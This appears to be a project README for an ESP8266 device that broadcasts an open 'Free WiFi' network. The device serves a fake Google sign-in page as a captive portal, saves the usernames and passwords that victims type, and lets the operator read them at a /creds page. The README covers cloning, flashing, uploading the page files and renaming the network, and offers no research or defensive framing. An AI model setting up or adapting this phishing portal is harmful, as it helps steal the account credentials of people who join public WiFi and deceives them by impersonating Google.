# WiFi Captive Portal

<img src="https://i.ibb.co/p68mg5xR/1738117645860.png" alt="screenshot of the project">

<!-- ABOUT THE PROJECT -->

## About The Project

This project creates a WiFi captive portal with a Google-style fake sign-in page. It captures user credentials and stores them in SPIFFS.

### Built With

-   [ESP8266WiFi](https://arduino-esp8266.readthedocs.io/en/latest/esp8266wifi/readme.html)
-   [DNSServer](https://arduino-esp8266.readthedocs.io/en/latest/esp8266wifi/readme.html#dnserver)
-   [ESP8266WebServer](https://arduino-esp8266.readthedocs.io/en/latest/esp8266webserver/readme.html)
-   [SPIFFS](https://arduino-esp8266.readthedocs.io/en/latest/filesystem.html)

<!-- GETTING STARTED -->

## Getting Started

To get a local copy up and running, follow these simple steps.

### Prerequisites

-   Arduino IDE
-   ESP8266 board package installed in Arduino IDE

### Installation

1. Clone the repo

    ```sh
    git clone https://github.com/disalad/ESP8266-Captive-Portal.git
    ```
2. Open the project in Arduino IDE
3. Select the correct board and port for your ESP8266 device
4. Upload the code to your ESP8266

### File Upload

1. Install the ESP8266 Sketch Data Upload tool
2. Upload the `data` folder contents to SPIFFS

    ```sh
    Tools > ESP8266 Sketch Data Upload
    ```

## Usage  

- Once deployed, connect to the WiFi network created by the ESP8266.  
- A fake Google sign-in page will be displayed upon opening any webpage.  
- Entered credentials will be saved in SPIFFS.  
- To view saved credentials, navigate to:  

    ```
    http://172.0.0.1/creds
    ```

- The WiFi network SSID (name) can be modified by changing the following line in `captive_portal.ino`:  

    ```cpp
    #define SSID_NAME "Free WiFi"
    ```

<!-- CONTACT -->

## Contact

Project Link: [https://github.com/disalad/ESP8266-Captive-Portal
](https://github.com/disalad/ESP8266-Captive-Portal)
